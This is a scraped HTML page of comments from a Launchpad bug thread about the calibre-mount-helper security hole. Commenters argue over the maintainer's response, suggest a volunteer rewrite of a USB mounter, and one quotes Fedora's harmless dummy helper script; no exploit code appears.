      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~preston-sumner" class="sprite person">Preston Sumner (preston-sumner)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T21:49:34.933088+00:00" title="2011-11-04 21:49:34 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/86"> #86</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@kovid:</p>
<p>I understand that you have a full plate, but your initial reaction was not just to question the legitimacy of the exploits but to dismiss them as sanctimonious when people kept insisting that the issues were more severe than you assumed. However, that you are apologetic is to be respected.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@kovid:

I understand that you have a full plate, but your initial reaction was not just to question the legitimacy of the exploits but to dismiss them as sanctimonious when people kept insisting that the issues were more severe than you assumed. However, that you are apologetic is to be respected.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/87" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~schwern" class="sprite person">Schwern (schwern)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-04T22:30:16.021333+00:00" title="2011-11-04 22:30:16 UTC">on 2011-11-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/87"> #87</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I agree with Preston.  Discussion rapidly devolved from the beginning into accusations thrown around.  Everybody is in a bad mood when they report bugs and when they receive bugs.  Extra care must be taken by everyone to avoid inflammation.  It would be helpful if the folks involved apologized, backed up and tried again.</p>
<p>What I would suggest to move forward is to see if anyone would like to volunteer to do the work on a rewrite.  The discussion has been focused on patching and breaking the existing implementation and arguing if it can be done better.   Nobody was ever asked for volunteers for a rewrite and that sort of discussion scares volunteers away.</p>
<p>@kovid What you can do now, as project owner, is create a branch and let people try and write a secure, cross platform capable mounter.  You don&#x27;t have to do much more than provide the branch and answer questions about the implementation as needed.  Most of your job will be to stay out of the way.  Let the volunteers work on their problem and see where it goes.</p>
<p>@Jason &amp; @Dan &amp; others:  Would you be willing to work on a cross platform mounter, either for calibre or as a 3rd party tool/library calibre could use?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I agree with Preston.  Discussion rapidly devolved from the beginning into accusations thrown around.  Everybody is in a bad mood when they report bugs and when they receive bugs.  Extra care must be taken by everyone to avoid inflammation.  It would be helpful if the folks involved apologized, backed up and tried again.

What I would suggest to move forward is to see if anyone would like to volunteer to do the work on a rewrite.  The discussion has been focused on patching and breaking the existing implementation and arguing if it can be done better.   Nobody was ever asked for volunteers for a rewrite and that sort of discussion scares volunteers away.

@kovid What you can do now, as project owner, is create a branch and let people try and write a secure, cross platform capable mounter.  You don't have to do much more than provide the branch and answer questions about the implementation as needed.  Most of your job will be to stay out of the way.  Let the volunteers work on their problem and see where it goes.

@Jason &amp; @Dan &amp; others:  Would you be willing to work on a cross platform mounter, either for calibre or as a 3rd party tool/library calibre could use?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/88" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T00:33:23+00:00" title="2011-11-05 00:33:23 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/88"> #88</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>As I have already  said, in a previous response, I would be delighted if<br />
someone developed a zero config library that worked across linux distributions<br />
and BSDs to mount USB devices. What&#x27;s needed is that it allow:</p>
<p>1) The mounting of any USB block device identified by device node<br />
&nbsp;&nbsp;&nbsp;to a mountpoint under /media</p>
<p>2) ejecting of any USB block device and the removal of the corresponding<br />
mountpoint under /media</p>
<p>3) It needs to be embeddable in a self contained distribution like calibre. In<br />
particular this means it must not require the application developer to tweak<br />
it, as such tweaking introduces the possibility of security holes.</p>
<p>However, let me emphasize that these functions are already performed adequately<br />
in modern linux distributions by udisks. An implementation of such a library<br />
in python has been present in calibre in udisks.py for years. This reduces the<br />
incentive of people to work on a solution approporiate to older distributions.<br />
That is regrettable, but unavoidable. Personally, I doubt any such library<br />
will ever be developed. Given the difficulties of dealing with paths securely,<br />
the easiest route to developing it, via calls to mount and eject is closed.<br />
Which means you would essentially have to re-implement mount and eject with<br />
additional logic to allow unprivileged users access to certain classes of<br />
device. That is a huge task.</p>
<p>At this point, people on older distributions will just have to manage their<br />
devices manually. I have taken my best shot at it, and failed. Someone else is<br />
more than welcome to pick up the gauntlet. A library like this has to be self<br />
contained, so development of it should not be part of a larger project like<br />
calibre.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">As I have already  said, in a previous response, I would be delighted if
someone developed a zero config library that worked across linux distributions
and BSDs to mount USB devices. What's needed is that it allow:

1) The mounting of any USB block device identified by device node 
   to a mountpoint under /media 

2) ejecting of any USB block device and the removal of the corresponding
mountpoint under /media

3) It needs to be embeddable in a self contained distribution like calibre. In
particular this means it must not require the application developer to tweak
it, as such tweaking introduces the possibility of security holes.

However, let me emphasize that these functions are already performed adequately
in modern linux distributions by udisks. An implementation of such a library
in python has been present in calibre in udisks.py for years. This reduces the
incentive of people to work on a solution approporiate to older distributions.
That is regrettable, but unavoidable. Personally, I doubt any such library
will ever be developed. Given the difficulties of dealing with paths securely,
the easiest route to developing it, via calls to mount and eject is closed.
Which means you would essentially have to re-implement mount and eject with
additional logic to allow unprivileged users access to certain classes of
device. That is a huge task.

At this point, people on older distributions will just have to manage their
devices manually. I have taken my best shot at it, and failed. Someone else is
more than welcome to pick up the gauntlet. A library like this has to be self
contained, so development of it should not be part of a larger project like
calibre.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/89" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mirabilos" class="sprite person">Thorsten Glaser (mirabilos)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T02:00:31.653744+00:00" title="2011-11-05 02:00:31 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/89"> #89</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>There is no /media on BSD.</p>
<p>(Other than that, YMMD.)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">There is no /media on BSD.

(Other than that, YMMD.)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/90" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~literalka" class="sprite person">Leon Kaiser (literalka)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T07:13:45.746483+00:00" title="2011-11-05 07:13:45 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/90"> #90</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/calibre/+bug/885027/+attachment/2585968/+files/fix.txt">Final Solution.</a>
        <a class="sprite edit action-icon" href="/calibre/+bug/885027/+attachment/2585968">Edit</a>
        (28 bytes,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Kovid,</p>
<p>Because of the treatment you demonstrate towards your users, I have decided to uninstall calibre, effective immediately.</p>
<p>Sincerely,</p>
<p>Leon Kaiser of the GNAA</p>
<p>PS: Can anyone suggest any alternatives to calibre?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Kovid,

Because of the treatment you demonstrate towards your users, I have decided to uninstall calibre, effective immediately.

Sincerely,

Leon Kaiser of the GNAA


PS: Can anyone suggest any alternatives to calibre?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/91" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~harris-reid" class="sprite person">Harris Reid (harris-reid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T07:27:38.878502+00:00" title="2011-11-05 07:27:38 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/91"> #91</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I was quite concerned and excited when I learned that I&#x27;ve got calibre-<wbr />mount-helper and saw these exploits getting lot of attention. my initial instinct was to uninstall calibre. Call me paranoid but it questions the security of the rest of the package as well. So I tested one of them:<br />
&nbsp;.50 version.<br />
&nbsp;Didn&#x27;t work, then I tried .60 and .70. didn&#x27;t work as well. I was disappointed.<br />
I was curious so I tried:<br />
$ cat /usr/bin/<wbr />calibre-<wbr />mount-helper<br />
And this is what I got:<br />
#!/bin/sh</p>
<p># This is a dummy script shipped in the fedora calibre package.<br />
# Since we have better/safer/easier ways to mount mass storage devices<br />
# there&#x27;s no need to have a suid binary try and do this.<br />
# This script simply exits telling calibre that the device is already<br />
# been mounted by your desktop.</p>
<p>exit 1</p>
<p>Thats when I remembered why I like Fedora.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I was quite concerned and excited when I learned that I've got calibre-mount-helper and saw these exploits getting lot of attention. my initial instinct was to uninstall calibre. Call me paranoid but it questions the security of the rest of the package as well. So I tested one of them:
 .50 version.
 Didn't work, then I tried .60 and .70. didn't work as well. I was disappointed.
I was curious so I tried:
$ cat /usr/bin/calibre-mount-helper
And this is what I got:
#!/bin/sh

# This is a dummy script shipped in the fedora calibre package. 
# Since we have better/safer/easier ways to mount mass storage devices
# there's no need to have a suid binary try and do this. 
# This script simply exits telling calibre that the device is already
# been mounted by your desktop. 

exit 1

Thats when I remembered why I like Fedora. </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/92" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~harris-reid" class="sprite person">Harris Reid (harris-reid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T07:33:07.888253+00:00" title="2011-11-05 07:33:07 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/92"> #92</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Also pardon my bad English  noncontributing comment (this one too).</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Also pardon my bad English  noncontributing comment (this one too).</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/93" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~ubuntu-launchpad-bobpaul" class="sprite person">Bob/Paul (ubuntu-launchpad-bobpaul)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T07:49:59.852739+00:00" title="2011-11-05 07:49:59 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/93"> #93</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Fou-Lu - Please, grow up. With much difficulty, he has removed the broken functionality/<wbr />exploitable code.</p>
<p>@Thorsten - I have /media on FreeBSD 8.2. That&#x27;s where KDE likes to mount things for me.</p>
<p>@Kovid - HAL was deprecated on linux, but not on BSD. Instead the issues in HAL were fixed, and the HAL we have on BSD is much improved compared with whatever HAL was last developed in the Linux kernel. As far as I can tell, GIO is working fine with HAL on my system, though I can&#x27;t say I&#x27;ve done any programming with it; I&#x27;ve always found it sufficient to mount/unmount manually using the dolphin file browser. As it sounds like many distros have already been specifically patching your application before distributing it in their repos, perhaps it would be good to survey what various package managers are doing on Fedora, Debian/Ubuntu, FreeBSD (it&#x27;s in ports...), OpenSuse, etc. Perhaps a consensus can be found that you&#x27;ve overlooked.</p>
<p>Or maybe &quot;a single binary that works everywhere without compiling&quot; solution just isn&#x27;t appropriate for the unix world. Certainly I make sure my users have a very good reason for installing anything from upstream sources on our network. If somethings in the repositories/ports collection, then there better be something seriously wrong with it to allow upgrading from somewhere else. I can certainly remember a few cases where the upstream developer was feigning ignorance while carefully crafting network security holes which package maintainers dutifully patched, until the project was finally excluded from the repos.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Fou-Lu - Please, grow up. With much difficulty, he has removed the broken functionality/exploitable code.

@Thorsten - I have /media on FreeBSD 8.2. That's where KDE likes to mount things for me.

@Kovid - HAL was deprecated on linux, but not on BSD. Instead the issues in HAL were fixed, and the HAL we have on BSD is much improved compared with whatever HAL was last developed in the Linux kernel. As far as I can tell, GIO is working fine with HAL on my system, though I can't say I've done any programming with it; I've always found it sufficient to mount/unmount manually using the dolphin file browser. As it sounds like many distros have already been specifically patching your application before distributing it in their repos, perhaps it would be good to survey what various package managers are doing on Fedora, Debian/Ubuntu, FreeBSD (it's in ports...), OpenSuse, etc. Perhaps a consensus can be found that you've overlooked.

Or maybe "a single binary that works everywhere without compiling" solution just isn't appropriate for the unix world. Certainly I make sure my users have a very good reason for installing anything from upstream sources on our network. If somethings in the repositories/ports collection, then there better be something seriously wrong with it to allow upgrading from somewhere else. I can certainly remember a few cases where the upstream developer was feigning ignorance while carefully crafting network security holes which package maintainers dutifully patched, until the project was finally excluded from the repos.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/94" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~ubuntu-launchpad-bobpaul" class="sprite person">Bob/Paul (ubuntu-launchpad-bobpaul)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T07:51:29.735224+00:00" title="2011-11-05 07:51:29 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/94"> #94</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>More clear had I written &quot;With much regret, he...&quot;.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">More clear had I written "With much regret, he...".</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/95" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~literalka" class="sprite person">Leon Kaiser (literalka)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T07:57:52.888197+00:00" title="2011-11-05 07:57:52 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/95"> #95</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@Bob/Paul He treated his userbase with contempt and disrespect. I refuse to use anything made by this man.</p>
<p>Leon Kaiser of the GNAA.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@Bob/Paul He treated his userbase with contempt and disrespect. I refuse to use anything made by this man.


Leon Kaiser of the GNAA.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/96" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~katanasov" class="sprite person">KAtanasov (katanasov)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T09:47:45.285194+00:00" title="2011-11-05 09:47:45 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/96"> #96</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>A typical example how one should _not_ report bug, and how one should _not_ respond to bug reports! Too much ego from reporter and developer only lead to great loss for Linux/BSD users.<br />
For bug reporters, please provide a link to amazing software/patch you wrote before you start preaching software practices! For developers, please treat your users with respect!</p>
<p>At the end, the bug at least show the sorry state we have on Linux in regards of modern programs dealing with various devices.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">A typical example how one should _not_ report bug, and how one should _not_ respond to bug reports! Too much ego from reporter and developer only lead to great loss for Linux/BSD users.
For bug reporters, please provide a link to amazing software/patch you wrote before you start preaching software practices! For developers, please treat your users with respect!

At the end, the bug at least show the sorry state we have on Linux in regards of modern programs dealing with various devices.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/97" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~javier3453" class="sprite person">Neo (javier3453)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-05T11:41:00.925091+00:00" title="2011-11-05 11:41:00 UTC">on 2011-11-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/97"> #97</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>As calibre user I want it to work out of the box, but I would prefer having to execute it as root every time just to have its full features, rather than giving every user on the system the ability of become root. I agree with ravomavain on this, gksu is the way to go.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">As calibre user I want it to work out of the box, but I would prefer having to execute it as root every time just to have its full features, rather than giving every user on the system the ability of become root. I agree with ravomavain on this, gksu is the way to go.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/98" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
